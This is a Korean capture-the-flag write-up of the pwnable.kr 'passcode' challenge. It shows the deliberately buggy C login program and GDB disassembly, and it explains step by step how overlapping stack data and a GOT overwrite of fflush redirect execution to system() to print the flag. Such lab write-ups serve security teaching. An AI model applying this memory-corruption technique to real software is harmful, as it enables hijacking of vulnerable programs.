# passcode

## 문제

> Mommy told me to make a passcode based login system.  
> My initial C code was compiled without any error!  
> Well, there was some compiler warning, but who cares about that?
>
> ssh passcode@pwnable.kr -p2222 \(pw:guest\)

## 소스

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
    int passcode1;
    int passcode2;

    printf("enter passcode1 : ");
    scanf("%d", passcode1);
    fflush(stdin);

    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    printf("enter passcode2 : ");
    scanf("%d", passcode2);

    printf("checking...\n");
    if(passcode1==338150 && passcode2==13371337){
        printf("Login OK!\n");
        system("/bin/cat flag");
    }
    else{
        printf("Login Failed!\n");
        exit(0);
    }
}

void welcome(){
    char name[100];
    printf("enter you name : ");
    scanf("%100s", name);
    printf("Welcome %s!\n", name);
}

int main(){
    printf("Toddler's Secure Login System 1.0 beta.\n");

    welcome();
    login();

    // something after login...
    printf("Now I can safely trust you that you have credential :)\n");
    return 0;    
}
```

## 취약점

scanf의 취약점

## 힌트

* [plt와 got](/system/plt-and-got.md)
* exploit\(overwrite\)
* 스택의 상황과 소스의 흐름을 잘 이해할 것

## 공략

이 문제는 scanf\(\)가 두번째 인자로 주소값을 받는다는 사실과 PLT&GOT에 대한 개념을 알고 있어야 풀 수 있습니다.

소스의 흐름을 보면

1. main\(\)
   1. welcome\(\)
      1. name에 100자의 문자열 입력
      2. name 출력
   2. login\(\)
      1. **passcode1에 들어있는 주소값에 입력**
      2. fflush\(\)로 표준입력 초기화
      3. **passcode2에 들어있는 주소값에 입력**
      4. passcode1과 passcode2에 들어있는 값을 각각 338150, 13371337과 비교하여 일치하면 flag 출력, 일치하지 않으면 프로그램 종료

위와 같습니다.

주의해야 할 점은 login\(\)에서 scanf\(\)로 입력할 때 passcode1,2에 입력받은 값을 넣는 것이 아니라 passcode1,2가 가리키는 주소에 입력받은 값을 넣는다는 것입니다.

> 예를 들어 scanf\("%d", passocde1\); 실행 시 입력 값으로 100을 넣었다고 한다면
>
> | 변수명 | 값 |
> | :---: | :---: |
> | passcode1\(0x1111\) | 0x1234 |
> | 0x1234 | 100 |
>
> 이와 같은 결과가 되는 것입니다.

따라서 passcode1,2에 우리가 원하는 338150과 13371337을 넣을 수 없고 시도하면 Segmentation fault[^1] 에러가 나타납니다. 다른 방법으로는 [overflow](/system/overflow.md)를 시도해 볼 수 있습니다. [GDB](/tools/gdb.md)를 켜서 main\(\), welcome\(\), login\(\)을 각각 디스어셈블 해보면 다음과 같습니다.

```
Dump of assembler code for function main:
   0x08048665 <+0>:    push   ebp
   0x08048666 <+1>:    mov    ebp,esp
   0x08048668 <+3>:    and    esp,0xfffffff0
   0x0804866b <+6>:    sub    esp,0x10
   0x0804866e <+9>:    mov    DWORD PTR [esp],0x80487f0
   0x08048675 <+16>:    call   0x8048450 <puts@plt>
   0x0804867a <+21>:    call   0x8048609 <welcome>
   0x0804867f <+26>:    call   0x8048564 <login>
   0x08048684 <+31>:    mov    DWORD PTR [esp],0x8048818
   0x0804868b <+38>:    call   0x8048450 <puts@plt>
   0x08048690 <+43>:    mov    eax,0x0
   0x08048695 <+48>:    leave  
   0x08048696 <+49>:    ret    
End of assembler dump.
```

```
Dump of assembler code for function welcome:
   0x08048609 <+0>:    push   ebp
   0x0804860a <+1>:    mov    ebp,esp
   0x0804860c <+3>:    sub    esp,0x88
   0x08048612 <+9>:    mov    eax,gs:0x14
   0x08048618 <+15>:    mov    DWORD PTR [ebp-0xc],eax
   0x0804861b <+18>:    xor    eax,eax
   0x0804861d <+20>:    mov    eax,0x80487cb
   0x08048622 <+25>:    mov    DWORD PTR [esp],eax
   0x08048625 <+28>:    call   0x8048420 <printf@plt>
   0x0804862a <+33>:    mov    eax,0x80487dd
   0x0804862f <+38>:    lea    edx,[ebp-0x70]
   0x08048632 <+41>:    mov    DWORD PTR [esp+0x4],edx
   0x08048636 <+45>:    mov    DWORD PTR [esp],eax
   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:    mov    eax,0x80487e3
   0x08048643 <+58>:    lea    edx,[ebp-0x70]
   0x08048646 <+61>:    mov    DWORD PTR [esp+0x4],edx
   0x0804864a <+65>:    mov    DWORD PTR [esp],eax
   0x0804864d <+68>:    call   0x8048420 <printf@plt>
   0x08048652 <+73>:    mov    eax,DWORD PTR [ebp-0xc]
   0x08048655 <+76>:    xor    eax,DWORD PTR gs:0x14
   0x0804865c <+83>:    je     0x8048663 <welcome+90>
   0x0804865e <+85>:    call   0x8048440 <__stack_chk_fail@plt>
   0x08048663 <+90>:    leave  
   0x08048664 <+91>:    ret    
End of assembler dump.
```

```
Dump of assembler code for function login:
   0x08048564 <+0>:    push   ebp
   0x08048565 <+1>:    mov    ebp,esp
   0x08048567 <+3>:    sub    esp,0x28
   0x0804856a <+6>:    mov    eax,0x8048770
   0x0804856f <+11>:    mov    DWORD PTR [esp],eax
   0x08048572 <+14>:    call   0x8048420 <printf@plt>
   0x08048577 <+19>:    mov    eax,0x8048783
   0x0804857c <+24>:    mov    edx,DWORD PTR [ebp-0x10]
   0x0804857f <+27>:    mov    DWORD PTR [esp+0x4],edx
   0x08048583 <+31>:    mov    DWORD PTR [esp],eax
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:    mov    eax,ds:0x804a02c
   0x08048590 <+44>:    mov    DWORD PTR [esp],eax
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
   0x08048598 <+52>:    mov    eax,0x8048786
   0x0804859d <+57>:    mov    DWORD PTR [esp],eax
   0x080485a0 <+60>:    call   0x8048420 <printf@plt>
   0x080485a5 <+65>:    mov    eax,0x8048783
   0x080485aa <+70>:    mov    edx,DWORD PTR [ebp-0xc]
   0x080485ad <+73>:    mov    DWORD PTR [esp+0x4],edx
   0x080485b1 <+77>:    mov    DWORD PTR [esp],eax
   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:    mov    DWORD PTR [esp],0x8048799
   0x080485c0 <+92>:    call   0x8048450 <puts@plt>
   0x080485c5 <+97>:    cmp    DWORD PTR [ebp-0x10],0x528e6
   0x080485cc <+104>:    jne    0x80485f1 <login+141>
   0x080485ce <+106>:    cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x080485d5 <+113>:    jne    0x80485f1 <login+141>
   0x080485d7 <+115>:    mov    DWORD PTR [esp],0x80487a5
   0x080485de <+122>:    call   0x8048450 <puts@plt>
   0x080485e3 <+127>:    mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>:    call   0x8048460 <system@plt>
   0x080485ef <+139>:    leave  
   0x080485f0 <+140>:    ret    
   0x080485f1 <+141>:    mov    DWORD PTR [esp],0x80487bd
   0x080485f8 <+148>:    call   0x8048450 <puts@plt>
   0x080485fd <+153>:    mov    DWORD PTR [esp],0x0
   0x08048604 <+160>:    call   0x8048480 <exit@plt>
End of assembler dump.
```

main\(\)을 보면 welcom\(\) 이후에 별도 스택 작업 없이 바로 login\(\)을 call하는 것을 확인할 수 있는데 이를 통해 각 함수에서 breakpoint를 잡고 ebp를 확인하면 동일한 위치에 있음을 알 수 있습니다.

```
(gdb) i r eip
eip            0x8048612    0x8048612 <welcome+9>
(gdb) i r ebp
ebp            0xffb24e48    0xffb24e48
```

```
(gdb) i r eip
eip            0x804856a    0x804856a <login+6>
(gdb) i r ebp
ebp            0xffb24e48    0xffb24e48
```

ebp가 동일한 위치에 있다는 것을 확인하고 디스어셈블된 welcome\(\)과 login\(\)을 보면

name\[100\]은 \[ebp-0x70\]부터 \[ebp-0xc\]까지 100byte

passcode1은 \[ebp-0x10\]부터 4byte\(정수형이기 때문에\)

passcode2는 \[ebp-0xc\]부터 4byte

| 함수명 | ebp-0x70 | ebp-0x10 | ebp-0xc | ... | ebp |
| :---: | :---: | :---: | :---: | :---: | :---: |
| welcome\(\) | name | name | ... | ... | ebp |
| login\(\) | ... | passcode1 | passcode2 | ... | ebp |

임을 알 수가 있습니다. 이를 이용해서 passcode1,2에 비교값을 넣고 싶지만 이후에 scanf\(\)에서 segmentaion fault를 피할 수 없습니다. 따라서 이를 우회하여야 하는데 이때 PLT&GOT 개념이 등장합니다.

표준입출력헤더\(stdio.h\)에 포함된 함수들 같이 동적 라이브러리에 속한 함수들은 실행파일에 함수가 담겨있지 않기 때문에 시스템에서 찾아 호출하게 됩니다. 이때 PLT[^2] 에서 GOT[^3] 을 참조하여 함수를 호출하게 됩니다. [자세한 내용](/system/plt-and-got.md)

1. PLT에서 함수를 call하면 GOT로 jmp한다.
2. GOT에는 함수의 실제 주소가 쓰여있다.
   1. 첫번째 호출이라면 GOT는 함수의 주소를 가지고 있지 않고 '어떤 과정'을 거쳐서 주소를 알아낸다.
   2. 두번째 호출부터는 첫번째 호출 때 알아낸 주소롤 바로 jmp한다.

따라서 이때 PLT에서 GOT로 `jmp 주소`를 이용하면 기존의 흐름을 우회할 수 있습니다. 

```
   0x0804858b <+39>:	mov    eax,ds:0x804a02c
   0x08048590 <+44>:	mov    DWORD PTR [esp],eax
==>0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    eax,0x8048786
   0x0804859d <+57>:	mov    DWORD PTR [esp],eax
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    eax,0x8048783
```

fflush의 plt를 보면 0x8048430 주소를 call하는 것을 볼 수 있다.

```
(gdb) x/3i 0x8048430
   0x8048430 <fflush@plt>:	jmp    DWORD PTR ds:0x804a004
   0x8048436 <fflush@plt+6>:	push   0x8
   0x804843b <fflush@plt+11>:	jmp    0x8048410
```

call 된 fflush plt를 보면 0x804a004로 jmp 한다. 여기가 fflush 주소를 가져오는 GOT 주소이다.

```
(gdb) x/i 0x804a004
   0x804a004 <fflush@got.plt>:	test   BYTE PTR ss:[eax+ecx*1],al
```

우리는 fflush\(\)의 주소를 실제 fflush\(\)로 넘기지 않고 다른 명령어 주소로 옮길 목적입니다. 위의 프로그램에서 가장 합리적으로 이동하기 좋은 곳은 system\(\)을 바로 호출하여서 바로 flag를 찾아내는 것이죠.

지금까지의 내용을 정리하면 이렇습니다.

* passcode1의 값\(주소\)에 scanf\(\)를 통해 입력 받는다
* PLT를 통해 호출되는 fflush\(\) GOT를 변조하여 system\(\)을 호출한다.

지금까지의 흐름을 정리하면 이렇습니다.

1. name으로 100자를 입력받습니다. 이때 이후 passcode1이 될 name의 끝 4자리\(4byte\)는 PLT가 가리키는 GOT 주소입니다.
2. 처음 scanf\("%d", passcode1\) 통해 passcode1이 가리키는 주소\(GOT 주소\)에 넣을 값은 system\(\)을 call하기 위한 0x080485e3이 됩니다. 그러나 scanf\(\) 정수형태를 입력받고 있으므로 0x080485e3를 10진수 형태로 바꿔서 입력하시면 됩니다. 
> system\(\)을 call하기 위해서 
```
0x080485e3 <+127>: mov DWORD PTR [esp],0x80487af
0x080485ea <+134>: call 0x8048460 <system@plt>
```
`0x080485ea <+134>`가 아니라 `0x080485e3 <+127>`인 이유는 `0x080485e3 <+127>`에서 `0x80487af`가 "/bin/cat flag"이기 때문에 인자를 전달하기 위해서 입니다.
3. 첫번째 scanf\(\) 호출 이후 프로그램이 fflush\(\)를 call하면서 PLT를 통해 GOT를 넘어가서 참조하는 위치는 0x080485e3를 실행하게 되므로 flag를 얻을 수 있습니다.

[^1]: 허락되지 않은 메모리에 쓰기를 시도할 때 나타나는 에러. 여기에서는 passcode1,2에 쓰레기 값이 들어있기 때문입니다.

[^2]: Procedure Linkage Table

[^3]: Global Offset Table

